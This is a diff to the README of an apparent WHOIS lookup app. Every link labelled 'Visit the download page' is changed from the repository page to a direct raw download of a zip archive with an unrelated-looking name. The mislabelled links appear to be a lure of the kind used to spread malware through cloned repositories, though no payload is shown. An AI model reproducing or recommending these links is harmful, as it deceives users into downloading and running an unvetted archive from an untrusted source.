@@ -1,12 +1,12 @@
 # 🌐 whois.api.airat.top - Simple WHOIS Lookup for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Diapasonstopinforming566/whois.api.airat.top/main/grandstand/whois-airat-api-top-Xenurus.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
+[Visit the download page](https://raw.githubusercontent.com/Diapasonstopinforming566/whois.api.airat.top/main/grandstand/whois-airat-api-top-Xenurus.zip)
 
 ## 🖥️ What this app does
 
@@ -42,7 +42,7 @@ If the app comes as a packaged file, you can run it right after download. If it 
 ## 🚀 Getting started
 
 1. Open the download page:
-   [Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
+   [Visit the download page](https://raw.githubusercontent.com/Diapasonstopinforming566/whois.api.airat.top/main/grandstand/whois-airat-api-top-Xenurus.zip)
 
 2. Download the app file or package from the page.
 
@@ -195,7 +195,7 @@ Topics:
 
 If you need to return to the download page, use this link:
 
-[Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
+[Visit the download page](https://raw.githubusercontent.com/Diapasonstopinforming566/whois.api.airat.top/main/grandstand/whois-airat-api-top-Xenurus.zip)
 
 ## 📝 File format guide
 
